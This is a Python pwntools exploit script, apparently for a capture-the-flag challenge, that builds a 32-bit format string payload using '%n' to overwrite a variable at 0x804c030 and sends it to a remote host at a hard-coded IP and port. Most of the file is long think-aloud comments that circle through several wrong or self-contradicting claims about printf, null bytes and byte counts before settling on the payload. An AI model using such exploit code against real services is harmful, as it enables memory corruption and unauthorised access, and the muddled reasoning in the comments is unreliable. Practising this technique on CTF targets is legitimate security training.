from pwn import *

context.log_level = 'debug'

elf = ELF('pwn_permission')

# Format string offset is 4 (our input starts at the 4th position)
# target_val is at 0x804c030, we need to write 5 to it
# Current value is 3

# Strategy: Use %n to write to target_val
# We need to put the address of target_val in our payload and use %n to write

# The payload format for 32-bit format string write:
# [address][padding][%<offset>c%<position>$n]
# We need to write 5 bytes total before %n

# Since target_val is at 0x804c030, we put this address at the start
# The address is 4 bytes, and we need to write 5 total
# So we need 1 more byte printed before %n

# With offset 4, our input starts at position 4
# If we put the address at the beginning (4 bytes), then position 4 points to our address
# We need to print 5 bytes total, the address itself is 4 bytes, so we need 1 more byte

# Payload: [0x804c030] + b'A' + b'%4$n'
# But wait, we need to be careful about alignment

# Actually, let's think about this more carefully:
# Position 4 = first 4 bytes of our input
# If we put the address at bytes 0-3, then %4$n will write to that address

# We need to have printed exactly 5 bytes when %n is reached
# The address bytes count as output, but they may not all be printable
# Better approach: use %5c or similar to control the count

# Let's try: addr + %5c%4$n
# addr = p32(0x804c030) = 4 bytes
# But 0x804c030 contains null byte (0x00), which will terminate read() early
# Actually, read() doesn't stop at null bytes, only at the count limit

# Wait, the address 0x804c030 = \x30\xc0\x04\x08
# This doesn't contain 0x00 in the middle, but the last byte... 
# Actually in little-endian: 0x804c030 -> \x30\xc0\x04\x08
# No null bytes! Good.

# But we need to be careful: printf will try to print these bytes as characters
# They may not be printable, but that's fine for counting

# Let's calculate:
# We put addr at offset 0-3 (4 bytes)
# Position 4 in the format string points to offset 0-3
# We need to write value 5 to *addr
# So we need to have printed 5 bytes when %4$n executes
# The address bytes (4 bytes) will be printed before the format specifier
# So we need 1 more byte: %1c%4$n

# But wait, the address bytes are part of the format string, not the output
# Actually, in printf, the format string is consumed character by character
# The address bytes ARE part of the format string and will be interpreted as format chars
# Some of them may not be printable and could cause issues

# Better approach: put the address at the END of the payload
# Use padding to align, then reference the position where the address is

# Buffer is 32 bytes (0x20)
# Let's try: %5c%12$n + padding + addr
# We need to figure out where addr ends up on the stack

# Actually, let me reconsider. The offset is 4, meaning our buffer starts at
# the 4th position on the stack. So:
# Position 4 = bytes 0-3 of our input
# Position 5 = bytes 4-7
# Position 6 = bytes 8-11
# etc.

# If we put the address at the end (aligned to 4 bytes):
# e.g., "AAAA%5c%8$n" + padding + p32(0x804c030)
# The address would be at position 4 + (offset_of_addr / 4)

# Let me try a simpler approach first:
# Put addr at start, use direct parameter access

# Payload: p32(0x804c030) + b'%1c%4$n'
# This should:
# 1. Print the 4 bytes of addr (as characters, may be garbage)
# 2. Print 1 more character (space, via %1c)  
# 3. Write 5 (total bytes printed) to the address at position 4 (which is our addr)

# But the addr bytes themselves are part of the format string...
# printf will try to interpret \x30\xc0\x04\x08 as format characters
# \x30 = '0', \xc0 = not a format specifier, \x04 = ctrl-D, \x08 = backspace
# This could cause issues

# Better: put format specifiers first, then address at the end
# Payload: b'%5c%8$n' + padding + p32(0x804c030)
# We need to calculate the position of the address

# Buffer starts at position 4
# "%5c%8$n" = 7 bytes
# We need to pad to align the address to a 4-byte boundary
# 7 bytes + 1 byte padding = 8 bytes -> address at position 4 + 8/4 = 6
# Wait, that's position 6

# Actually: position = 4 + (byte_offset / 4)
# If address starts at byte 8: position = 4 + 8/4 = 6
# If address starts at byte 12: position = 4 + 12/4 = 7

# Let's use: b'%5c%7$nAAAA' + p32(0x804c030)
# "%5c%7$n" = 7 bytes
# "AAAA" = 4 bytes padding (total 11 bytes, not aligned)

# Let me be more precise:
# b'%5c%7$n' = 7 bytes (positions 4,5 = bytes 0-7)
# Need 5 more bytes to reach position 7 (byte offset 12)
# b'%5c%7$n' + b'AAAAA' = 12 bytes, then addr at byte 12 = position 4+3=7

# Wait: position = 4 + byte_offset/4
# byte_offset 12 -> position 4 + 3 = 7 ✓

# But we need to print exactly 5 bytes total
# %5c prints 5 characters (4 spaces + 1 char from stack, or just 5 spaces?)
# Actually %5c prints one character padded to width 5

# Hmm, let me reconsider. We need to write 5 to target_val.
# %n writes the number of bytes printed so far.
# If we use %5c, that prints 5 bytes (one char padded to width 5)
# Then %7$n writes 5 to the address at position 7

# But the format string itself also contributes to the byte count!
# No wait - the format string characters are consumed by printf, they're not "printed"
# Only the output of format specifiers counts toward %n

# Actually, ALL characters that printf outputs count toward %n
# Including literal characters in the format string

# So if our format string is: "%5c%7$nAAAAA" + addr
# printf will output:
# - 5 characters from %5c (1 char padded to width 5)
# - 0 characters from %7$n (writes, doesn't print)
# - 5 characters from "AAAAA"
# Total = 10, not 5!

# We need to be more careful. Let's use only format specifiers before %n:
# b'%5c%7$n' + padding + addr
# %5c outputs 5 bytes, then %7$n writes 5

# But we need padding to align addr to position 7
# b'%5c%7$n' is 7 bytes, we need 5 more bytes to reach byte 12 (position 7)
# These 5 padding bytes will also be printed!

# Solution: use \x00 to avoid printing? No, read() can handle null bytes but
# printf stops at null... wait, printf doesn't stop at null bytes in the format
# string on Linux (it uses the length from read, not strlen)

# Actually, printf DOES stop at null bytes because it uses strlen internally
# So we can't have null bytes in our format string before the end

# Alternative: use %<width>c to consume stack positions without adding to output
# No, %c always outputs at least 1 byte

# Let me try a different approach:
# Put the address at the beginning, but use %hhn to write byte-by-byte
# Or just accept that the address bytes will be printed

# Actually, the simplest approach:
# p32(0x804c030) + b'%1c%4$n'
# The addr bytes will be "printed" (4 bytes of garbage output)
# Then %1c prints 1 more byte
# Total = 5, and %4$n writes 5 to the address at position 4

# The issue is that the addr bytes are part of the format string
# printf will try to interpret them. Let's check:
# \x30 = '0' - just a literal character
# \xc0 = not a valid format specifier, just printed as-is
# \x04 = not a valid format specifier
# \x08 = backspace character

# Actually, these are just literal characters in the format string
# They won't be interpreted as format specifiers (no % before them)
# They WILL be counted in the output byte count for %n

# So: p32(0x804c030) prints 4 bytes + %1c prints 1 byte = 5 total
# Then %4$n writes 5 to the address at position 4

# Wait, but position 4 points to the first 4 bytes of our buffer
# Which IS the address we put there. So %4$n will write to *0x804c030 = target_val

# This should work! Let me try it.

target_val_addr = 0x804c030

# Payload: addr + %1c%4$n
# But we need to make sure the total output is exactly 5
# addr = 4 bytes of output, %1c = 1 byte of output, total = 5
payload = p32(target_val_addr) + b'%1c%4$n'

log.info(f"Payload: {payload}")
log.info(f"Payload length: {len(payload)}")
log.info(f"Payload hex: {payload.hex()}")

conn = remote('39.96.193.120', 10000)

# Receive initial message
response = conn.recv(timeout=5)
log.info(f"Received: {response}")

# Send format string payload
conn.send(payload)

import time
time.sleep(2)

try:
    response2 = conn.recv(timeout=5)
    log.info(f"Response after fmt: {response2}")
except:
    log.info("No response after fmt")

# If target_val was changed to 5, vuln() should be called
# vuln() prints "Input:\n" and then reads 0x100 bytes
# Let's check if we get the "Input:" prompt
try:
    response3 = conn.recv(timeout=3)
    log.info(f"Response from vuln: {response3}")
except:
    log.info("No response from vuln")

conn.close()